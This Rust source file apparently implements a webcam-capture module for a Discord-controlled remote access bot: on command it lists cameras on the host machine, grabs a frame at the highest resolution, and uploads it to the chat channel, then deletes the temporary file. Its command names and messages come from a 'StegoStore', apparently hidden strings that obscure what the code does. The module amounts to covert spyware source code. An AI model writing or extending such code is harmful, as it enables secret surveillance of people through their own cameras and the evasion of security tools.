use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

use chrono::Utc;
use std::{env, fs};

use nokhwa::{
    pixel_format::RgbFormat,
    query as nokhwa_query,
    utils::{ApiBackend, CameraIndex, RequestedFormat, RequestedFormatType},
    Camera,
};

use image::{codecs::png::PngEncoder, ImageEncoder};
pub struct WebcamCommand;

impl WebcamCommand {
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for WebcamCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("WEBCAM_NAME").into_boxed_str())
    }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "WEBCAM").into_boxed_str())
    }
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_UTIL").into_boxed_str())
    }
    fn usage(&self) -> &str {
        Box::leak(Self::c("WEBCAM_USAGE").into_boxed_str())
    }
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("WEBCAM_EX1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("WEBCAM_EX2").into_boxed_str()) as &'static str,
            Box::leak(Self::c("WEBCAM_EX3").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("WEBCAM_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("WEBCAM_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = args.next().unwrap_or("0");

        if action == "list" {
            match nokhwa_query(ApiBackend::Auto) {
                Ok(cameras) => {
                    if cameras.is_empty() {
                        http.create_message(msg.channel_id.get(), &Self::m("CAM_ERR_NONE")).await?;
                        return Ok(());
                    }

                    let mut response = format!("{}\n```\n", Self::m("CAM_LIST_TITLE"));
                    for cam in cameras.iter() {
                        response.push_str(&format!("[{}] {}\n", cam.index(), cam.human_name()));
                    }
                    response.push_str("```");

                    http.create_message(msg.channel_id.get(), &response).await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id.get(), &Self::m("CAM_ERR_QUERY").replace("{}", &e.to_string())).await?;
                }
            }

            return Ok(());
        }

        let index_u32: u32 = action.parse().unwrap_or(0);

        http.create_message(msg.channel_id.get(), &Self::m("CAM_ACCESS_FMT").replace("{}", &index_u32.to_string())).await?;

        let temp_path = env::temp_dir().join(format!("webcam_{}.png", Utc::now().timestamp()));

        let capture_result = {
            let cam_index = CameraIndex::Index(index_u32);
            let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);

            match Camera::new(cam_index, requested) {
                Ok(mut camera) => {
                    match camera.frame() {
                        Ok(frame) => {
                            match frame.decode_image::<RgbFormat>() {
                                Ok(decoded_image) => {
                                    let width = decoded_image.width();
                                    let height = decoded_image.height();
                                    let raw_data = decoded_image.into_raw();

                                    let mut png_data = Vec::new();
                                    let encoder = PngEncoder::new(&mut png_data);

                                    match encoder.write_image(&raw_data, width, height, image::ExtendedColorType::Rgb8) {
                                        Ok(_) => {
                                            match fs::write(&temp_path, &png_data) {
                                                Ok(_) => Ok(()),
                                                Err(e) => Err(anyhow::anyhow!("Failed to write PNG file: {}", e))
                                            }
                                        }
                                        Err(e) => Err(anyhow::anyhow!("Failed to encode PNG: {}", e))
                                    }
                                }
                                Err(e) => Err(anyhow::anyhow!("Failed to decode frame: {}", e))
                            }
                        }
                        Err(e) => Err(anyhow::anyhow!("Failed to capture frame: {}", e))
                    }
                }
                Err(e) => Err(anyhow::anyhow!("Failed to open webcam: {}", e))
            }
        };

        match capture_result {
            Ok(_) => {
                match fs::read(&temp_path) {
                    Ok(image_data) => {
                        http.create_message_with_file(
                            msg.channel_id.into(),
                            &Self::m("CAM_CAP_FMT").replace("{}", &index_u32.to_string()),
                            &image_data,
                            &format!("webcam_{}.png", index_u32)
                        ).await?;

                        let _ = fs::remove_file(&temp_path);
                    }
                    Err(e) => {
                        http.create_message(msg.channel_id.get(), &Self::m("CAM_ERR_READ").replace("{}", &e.to_string())).await?;
                    }
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &Self::m("CAM_ERR_FMT").replace("{}", &e.to_string())).await?;
            }
        }

        Ok(())
    }
}



